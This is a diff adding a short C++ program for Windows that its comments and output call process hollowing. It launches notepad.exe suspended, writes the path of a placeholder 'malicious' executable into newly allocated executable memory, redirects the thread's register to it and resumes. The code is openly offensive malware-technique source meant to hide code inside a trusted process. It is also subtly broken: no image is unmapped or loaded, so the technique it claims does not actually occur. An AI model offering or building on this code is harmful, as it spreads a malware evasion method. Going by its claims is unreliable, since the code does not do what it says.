@@ -1,0 +1,71 @@
+#include <windows.h>
+#include <tlhelp32.h>
+#include <iostream>
+
+BOOL InjectProcess(LPCSTR targetProcess, LPCSTR maliciousExe) {
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+
+    // Start the target process in a suspended state
+    if (!CreateProcessA(targetProcess, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        std::cerr << "Failed to create process." << std::endl;
+        return FALSE;
+    }
+
+    // Get the context of the suspended process
+    CONTEXT ctx;
+    ctx.ContextFlags = CONTEXT_FULL;
+    if (!GetThreadContext(pi.hThread, &ctx)) {
+        std::cerr << "Failed to get thread context." << std::endl;
+        TerminateProcess(pi.hProcess, 1);
+        return FALSE;
+    }
+
+    // Allocate memory in the target process for the malicious executable
+    LPVOID pRemoteMemory = VirtualAllocEx(pi.hProcess, NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!pRemoteMemory) {
+        std::cerr << "Failed to allocate memory in target process." << std::endl;
+        TerminateProcess(pi.hProcess, 1);
+        return FALSE;
+    }
+
+    // Write the path of the malicious executable into the allocated memory
+    if (!WriteProcessMemory(pi.hProcess, pRemoteMemory, maliciousExe, strlen(maliciousExe) + 1, NULL)) {
+        std::cerr << "Failed to write memory in target process." << std::endl;
+        TerminateProcess(pi.hProcess, 1);
+        return FALSE;
+    }
+
+    // Replace the entry point of the target process with the malicious executable
+    ctx.Eax = (DWORD)pRemoteMemory;
+    if (!SetThreadContext(pi.hThread, &ctx)) {
+        std::cerr << "Failed to set thread context." << std::endl;
+        TerminateProcess(pi.hProcess, 1);
+        return FALSE;
+    }
+
+    // Resume the target process
+    if (ResumeThread(pi.hThread) == -1) {
+        std::cerr << "Failed to resume thread." << std::endl;
+        TerminateProcess(pi.hProcess, 1);
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+int main() {
+    const char* targetProcess = "C:\\Windows\\System32\\notepad.exe";
+    const char* maliciousExe = "C:\\Path\\To\\Malicious\\Code.exe";
+
+    if (InjectProcess(targetProcess, maliciousExe)) {
+        std::cout << "Process hollowing successful." << std::endl;
+    } else {
+        std::cerr << "Process hollowing failed." << std::endl;
+    }
+
+    return 0;
+}
